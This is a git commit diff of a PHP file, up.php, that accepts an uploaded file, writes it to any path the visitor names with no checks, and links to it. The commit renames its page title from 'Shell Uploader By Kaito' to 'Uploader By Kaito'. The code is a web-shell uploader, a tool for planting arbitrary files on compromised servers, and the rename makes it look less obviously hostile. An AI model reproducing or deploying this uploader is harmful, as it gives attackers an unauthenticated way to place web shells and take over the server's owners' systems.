24235bfac154f0fc085d4b072f0d60df4d7dd436
Kaito Legion <47966968+kaitolegion@users.noreply.github.com>
2020-08-30 12:41:39 +0800

    update up.php

--- up.php
+++ up.php
@@ -5,5 +5,5 @@ if ($files["name"] != '') {
     if (move_uploaded_file($files['tmp_name'], $fullpath)) {
         echo "<h1><a href='$fullpath'>Click Me!</a></h1>";
     }
-}echo '<html><head><title>Shell Uploader By Kaito</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
+}echo '<html><head><title>Uploader By Kaito</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
 ?>
